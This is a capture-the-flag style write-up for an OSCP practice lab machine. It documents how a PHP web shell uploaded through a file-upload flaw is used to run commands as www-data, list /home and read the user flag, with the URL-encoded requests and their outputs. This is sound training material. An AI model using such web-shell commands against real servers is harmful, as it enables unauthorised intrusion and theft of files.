---
type: machine-phase
project: OSCP-Exam-PoC
machine: VE-01
difficulty: Very Easy
phase: initial-access
status: completed
initial_user: www-data
initial_access: PHP Command Execution
target: x.x.x.x
http_port: PORT_L
flag_path: /home/user/user.txt
flag_submitted: true
tags:
  - oscp
  - ve-01
  - initial-access
  - file-upload
  - php
  - command-execution
  - linux-enumeration
---

# VE-01 — User Foothold

> **Flag completion:** User flag obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Objective

The initial examination objective was:

> Start VE-01 from the Machines page, attack the assigned instance, gain user-level access, and submit the contents of `user.txt`.

The challenge provided the following flag-location hint:

```
All user flags under /home/{user}/user.txt
All root flags under /root/flag.txt
```

The user-level objective was completed successfully.

## 2. Target Information

|Property|Value|
|---|---|
|Target IP|`x.x.x.x`|
|HTTP Port|`PORT_L`|
|Application URL|`http://x.x.x.x:PORT_L/`|
|Vulnerability|File upload|
|Execution mechanism|PHP command execution|
|Uploaded file endpoint|`/uploads/file.php`|
|Command parameter|`cmd`|
|Working directory|`/var/www/html/uploads`|
|Execution account|`www-data`|
|Identified home directory|`/home/user`|
|User flag|`/home/user/user.txt`|

## 3. Initial Access

### 3.1 Identify the Application Vulnerability

The initial examination identified a file-upload vulnerability in the web application.

The resulting PHP command-execution endpoint was:

```
http://x.x.x.x:PORT_L/uploads/file.php?cmd=
```

This endpoint accepted operating-system commands through the `cmd` query parameter.

**Important evidence limitation:** The examination record does not preserve the complete upload request, upload response, validation rules, or exact bypass used to upload the PHP file. The file-upload exploitation mechanism is therefore identified, but its complete reproduction procedure remains undocumented.

Do not invent the missing multipart request or claim a particular extension/MIME bypass.

### 3.2 Verify Command Execution

The first recorded command was:

```
pwd
```

Executed through:

```
http://x.x.x.x:PORT_L/uploads/file.php?cmd=pwd
```

Captured response:

```
/var/www/html/uploads
```

**Interpretation:**

- The uploaded PHP file was being executed by the web server.
    
- The `cmd` parameter provided command execution.
    
- The current working directory was `/var/www/html/uploads`.
    

This established a working in-band command-execution channel without requiring an interactive reverse shell.

### 3.3 Execution Context

The execution account was later identified through sudo enumeration:

```
Matching Defaults entries for www-data on veryeasy:

User www-data may run the following commands on veryeasy:
    (ALL) NOPASSWD: /usr/bin/find
```

This confirmed that the web application was executing commands as:

```
www-data
```

The sudo permission and its exploitation are documented separately in [[Difficulty Levels/Very Easy/VE-01/root]].

## 4. User Enumeration

### 4.1 Enumerate Home Directories

The challenge hint established that the user flag was located under `/home/{user}/user.txt`.

The following command was executed through the PHP endpoint:

```
ls -la /home
```

Request:

```
http://x.x.x.x:PORT_L/uploads/file.php?cmd=ls%20-la%20/home
```

Captured response:

```
total 16
drwxr-xr-x 1 root root 4096 Nov  3 15:37 .
drwxr-xr-x 1 root root 4096 Nov  4 17:17 ..
drwx--x--x 1 user user 4096 Nov  4 17:17 user
```

### 4.2 Identify the Target Account

The output identified one home directory:

```
/home/user
```

The target username was:

```
user
```

The directory permissions were:

```
drwx--x--x
```

Permission breakdown:

|Permission|Owner|Group|Others|
|---|---|---|---|
|Directory permissions|`rwx`|`--x`|`--x`|

The execute permission for others permits directory traversal when the path is known, even though it does not permit listing the directory's contents.

The identified flag path was therefore:

```
/home/user/user.txt
```

## 5. User Flag Retrieval

The command used to retrieve the flag was:

```
cat /home/user/user.txt
```

The corresponding URL-encoded request is:

```
http://x.x.x.x:PORT_L/uploads/file.php?cmd=cat%20%2Fhome%2Fuser%2Fuser.txt
```

The flag was successfully retrieved and submitted to the examination platform.

**Flag outcome:** Obtained and submitted (participant-confirmed). Public value: `IT{FLAG-SECRET}`.

Do not substitute a guessed flag value.

## 6. Attack Chain Summary

```
HTTP Application
       |
       v
File Upload Vulnerability
       |
       v
PHP Command Execution
       |
       v
/uploads/file.php?cmd=
       |
       v
Execution as www-data
       |
       v
Enumerate /home
       |
       v
Identify /home/user
       |
       v
Read /home/user/user.txt
       |
       v
Submit User Flag
       |
       v
User-Level Objective Completed
```

## 7. Evidence Register

|Evidence ID|Description|Recorded Evidence|Status|
|---|---|---|---|
|VE-01-U01|Initial target application|`http://x.x.x.x:PORT_L/`|Recorded|
|VE-01-U02|PHP execution endpoint|`/uploads/file.php?cmd=`|Recorded|
|VE-01-U03|Working directory|`/var/www/html/uploads`|Confirmed|
|VE-01-U04|Home directory enumeration|`ls -la /home` output|Confirmed|
|VE-01-U05|Username discovery|`/home/user`|Confirmed|
|VE-01-U06|Flag location|`/home/user/user.txt`|Identified|
|VE-01-U07|Flag retrieval|Flag submitted successfully| Obtained and submitted (participant-confirmed) |
|VE-01-U08|Execution identity|`www-data` from sudo enumeration|Confirmed|

## 8. Lessons Learned

### 8.1 Verify Server-Side Execution

A successful file upload alone does not prove remote command execution.

The `pwd` request and its returned output established that the uploaded PHP file was interpreted and executed by the server.

### 8.2 Use In-Band Execution When It Is Sufficient

An interactive shell was not necessary to complete the user-level objective.

The existing PHP command-execution endpoint was sufficient for:

- Directory enumeration.
    
- User discovery.
    
- Flag retrieval.
    

This avoided introducing unnecessary reverse-shell and VPN connectivity dependencies.

### 8.3 Follow the Challenge's Filesystem Hint

The examination explicitly provided the expected location of user flags.

Using that information reduced unnecessary filesystem exploration.

### 8.4 Understand Directory Traversal Permissions

A directory does not need to grant listing permissions for a known file path to be traversable.

The execute bit can permit traversal even when the directory contents cannot be listed.

### 8.5 Preserve the Execution Context

The initial command execution occurred as `www-data`, not as the account `user`.

This distinction became important during the next phase: privilege escalation.

## 9. Related Documentation

- [[VE-01 Overview]]
    
- [[Difficulty Levels/Very Easy/VE-01/root]]
    
- [[Methodology/Initial Access]]
    
- [[Methodology/Evidence Collection]]
    
- [[Difficulties & Lessons/Tooling and Workflow Mistakes]]
    

## 10. Completion Checklist

- Target application identified
    
- PHP command-execution endpoint established
    
- Working directory confirmed
    
- Execution account identified
    
- Home directory enumerated
    
- Username identified
    
- User flag path identified
    
- User flag submitted successfully
    
- Original file-upload request recovered
    
- Upload validation/bypass details recovered
    
- Raw user flag response preserved
    
- Supporting screenshots or HTTP evidence attached
    

**Phase result:** User-level objective completed. The next phase is [[Difficulty Levels/Very Easy/VE-01/root]], covering sudo enumeration and privilege escalation through GNU `find`.